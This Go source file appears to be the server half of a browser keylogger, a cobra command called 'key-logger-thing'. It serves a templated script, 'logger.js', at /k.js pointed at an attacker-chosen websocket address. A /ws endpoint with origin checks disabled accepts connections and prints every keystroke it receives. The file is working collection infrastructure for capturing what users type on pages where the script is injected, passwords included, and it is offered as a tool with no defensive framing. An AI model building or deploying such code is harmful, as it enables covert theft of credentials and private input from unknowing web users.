package cmd

import (
	"context"
	"fmt"
	"github.com/coder/websocket"
	"github.com/go-chi/chi/v5"
	"github.com/spf13/cobra"
	"html/template"
	"log"
	"net/http"
)

var (
	listenAddr    string
	websocketAddr string
	jsTemplate    *template.Template
)

var rootCmd = &cobra.Command{
	Use:   "key-logger-thing",
	Short: "Logs the keys",
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Printf("Listening on: %s\n", listenAddr)
		fmt.Printf("Websocket address: %s\n", websocketAddr)

		r := chi.NewRouter()
		r.Get("/ws", serveWebsocket)
		r.Get("/k.js", serveHTTP)
		log.Fatal(http.ListenAndServe(fmt.Sprintf("%s", listenAddr), r))
	},
}

func init() {
	rootCmd.Flags().StringVarP(&listenAddr, "listenAddress", "l", "", "The address to listen on")
	rootCmd.Flags().StringVarP(&websocketAddr, "websocketAddress", "w", "", "Address for websocket connection")
	rootCmd.MarkFlagRequired("listenAddress")
	rootCmd.MarkFlagRequired("websocketAddress")

	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}
}

func Execute() error {
	return rootCmd.Execute()
}

func serveWebsocket(w http.ResponseWriter, r *http.Request) {
	conn, err := websocket.Accept(w, r, &websocket.AcceptOptions{
		InsecureSkipVerify: true,
	})
	if err != nil {
		http.Error(w, "websocket died :c", 500)
	}
	defer func() { _ = conn.CloseNow() }()

	for {
		_, msg, err := conn.Read(context.Background())
		if err != nil {
			break
		}

		msgString := string(msg)
		if len(msgString) > 1 {
			msgString = fmt.Sprintf(" [[%s]] ", msgString)
		}

		fmt.Printf("%s", msgString)
	}
}

func serveHTTP(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	err := jsTemplate.Execute(w, websocketAddr)
	if err != nil {
		log.Fatal(err)
	}
}
